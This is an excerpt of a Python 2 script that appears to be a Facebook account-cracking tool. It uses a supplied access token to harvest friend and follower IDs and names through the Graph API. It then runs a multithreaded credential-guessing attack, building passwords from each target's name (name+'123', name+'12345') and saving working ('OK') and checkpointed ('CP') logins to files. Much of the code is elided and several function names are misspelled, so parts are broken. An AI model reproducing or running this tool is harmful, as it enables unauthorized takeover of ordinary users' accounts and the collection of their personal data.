...
def tod():
    titik = ['\x1b[1;91m.   ', '\x1b[1;92m..  ', '\x1b[1;95m... ','\x1b[1;92m.   ', '\x1b[1;94m..  ', '\x1b[1;91m... ']
    for x in titik:
...
def banner():
	os.system("clear")
	os.system('echo  "\n\n   _______                             __                                       ________   /n  |       \                           |  \                                     |        \   /n  | ▓▓▓▓▓▓▓\ ______  _______   ______ | ▓▓____   ______   ______  ________      \▓▓▓▓▓▓▓▓______ ____   /n  | ▓▓__| ▓▓/      \|       \ /      \| ▓▓    \ |      \ |      \|        \       | ▓▓  |      \    \   /n  | ▓▓    ▓▓  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ \▓▓▓▓▓▓\ \▓▓▓▓▓▓\\▓▓▓▓▓▓▓▓       | ▓▓  | ▓▓▓▓▓▓\▓▓▓▓\   /n  | ▓▓▓▓▓▓▓\ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓/      ▓▓/      ▓▓ /    ▓▓        | ▓▓  | ▓▓ | ▓▓ | ▓▓   /n  | ▓▓  | ▓▓ ▓▓__/ ▓▓ ▓▓  | ▓▓ ▓▓__| ▓▓ ▓▓__/ ▓▓  ▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓/  ▓▓▓▓_        | ▓▓  | ▓▓ | ▓▓ | ▓▓   /n  | ▓▓  | ▓▓\▓▓    ▓▓ ▓▓  | ▓▓\▓▓    ▓▓ ▓▓    ▓▓\▓▓    ▓▓\▓▓    ▓▓  ▓▓    \       | ▓▓  | ▓▓ | ▓▓ | ▓▓   /n  \▓▓   \▓▓ \▓▓▓▓▓▓ \▓▓   \▓▓_\▓▓▓▓▓▓▓\▓▓▓▓▓▓▓  \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓\▓▓▓▓▓▓▓▓        \▓▓   \▓▓  \▓▓  \▓▓   /n  |  \__| ▓▓   /n  \▓▓    ▓▓    /n  \▓▓▓▓▓▓   /n  lolcat -a -d 2 -8')
	print("")
...
def rongbaaztm():
    os.system('clear')
    banner()
    print("%s IF YOU DON'T KNOW HOW TO GET TOKEN SEND MSG OUR PAGE (%sOPEN%s)")%(K,H,K)
    print("")
...
def rongbaaz_tm():
    ...
    try:
        ...
        print '\n %s[%s×%s] WORNG TOKEN'%(N,M,N);time.sleep(2);os.system('rm -rf token.txt');rongbaaztm()
    try:
    ...
    print("%s	DEVICE LOCATION  : %s%s ")%(K,H,loc)
    ...
    os.system("xdg-open https://www.facebook.com/100466858653425")
    innocent = raw_input('\n\033[91;1m [*] MENU :\033[91;1m ')
    if innocent == '':
        print "\n %s[%s×%s] DON'T LEAVE "%(N,M,N);time.sleep(2);rongbaaz_tm()
...
def teman(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/me/friends?access_token=%s'%(nunu)).json()["data"]:
            ...
            w = random.choice(['\x1b[1;92m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;98m', '\x1b[1;91m', '\x1b[0m'])
        ...
        os.system('echo "________________________________________________________________________________________________" | lolcat -a -d 2 -8')
        raw_input(' [%s ENTER%s ] '%(O,N));rongbaaz_tm()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] ID DUMP FAILED, MAYBE THE ID IS NOT PUBLIC CHACK THE ID.\n'%(N,M,N))
...
def followers(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(mravu,nunu)).json()["data"]:
            ...
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;92m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;98m', '\x1b[1;91m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;91m%s\033[0m] [\033[0;93m%s\033[0m] PROCESS DUMP ID...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)
        ...
        os.system('echo "______________________________________________________________________________________________" | lolcat -a -d 2 -8')
        raw_input('%s [%s ENTER%s ] '%(N,O,N));rongbaaz_tm()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] FAILED TO DUMP ID, PROBABLY ID IS NOT PUBLIC.\n'%(N,M,N))
        raw_input(' [ %sBACK%s ] '%(O,N));romgbaaz_tm()
...
def ua_settings():
    ...
    ytbjts = raw_input('\n %s[%s?%s] CHOOSE : '%(N,O,N))
    if ytbjts == '':
        print "\n %s[%s×%s] DON'T LEAVE "%(N,M,N);time.sleep(2);ua_settings()
    elif ytbjts =='1':
        ua_change()
    elif ytbjts =='2':
        check_uag()
...
def ua_change():
    ...
    if mew == '':
        print "\n %s[%s×%s] DON'T LEAVE  "%(N,M,N);ua_change()
    try:
...
def check_uag():
    try:
        user_agent = open('rongbaaz_ua.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
...
class __crack__:
                ...
                if pwek == '':
                    ...
                    def __rongbaaz__(uvarm=None): 
                        ...
                        if cin == '':
                            ...
                            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
                            with rongbaaztn(max_workers=30) as (__rongbaaz__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                            ...
                            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
                            with rongbaa_tm(max_workers=30) as (__rongbaaz__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                            ...
                            print '\n %s[%s×%s] WRONG INPUT BRO!'%(N,M,N);self.__rongbaaz__()
                    print '\n [ CHOOSE THE LOGIN METHOD ]\n'
                    print ' [%s1%s]. API METHOD (FAST)'%(O,N)
                    print ' [%s2%s]. MBASIC METHOD (SLOW/BAST)'%(O,N)
                    print ' [%s3%s]. MOBILE METHOD (VERY SLOW)'%(O,N)
                    __rongbaax__(pwek.split(','))
                    break
        elif ___rongbaaz_tm___ in ('N', 'n'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow/bast)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] Y/N STUPID! -_-'%(N,M,N);time.sleep(2);rongbaaz()
        return
    ...
    def __api__(self, user, __axm__):
        ...
        sys.stdout.flush()
        for pw in __rongbaaz__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_nunu = open('rongbaaz_ua.txt', 'r').read()
            except (KeyError, IOError):
    ...
    def __mfb__(self, user, __rongbaaz__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [CRACK] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __axm__:
    ...
    def __pler__(self):
        rongbaaz = raw_input('\n [*] METHOD : ')
        if rongbaaz == '':
            print "\n %s[%s×%s] DON'T LEAVE "%(N,M,N);self.__pler__()
        elif rongbaz in ('1', '01'):
            print '\n [%s+%s] OK RESULTS ARE SAVED TO -> RESULTS/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
            with rongbaaz_tm(max_workers=30) as (__rongbaaz__):
            	for rongbaaz in self.id: 
                    try:
                        uid, name = rongbaaz.split('<=>')
                        xz = name.split(' ')
            	...
            	for rongbaaz in self.id:
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            xnx = [name, xz[0]+"123", xz[0]+"12345"]
                        __rongbaaz__.submit(self.__mfb__, uid, xnx)
                    except:
                        pass
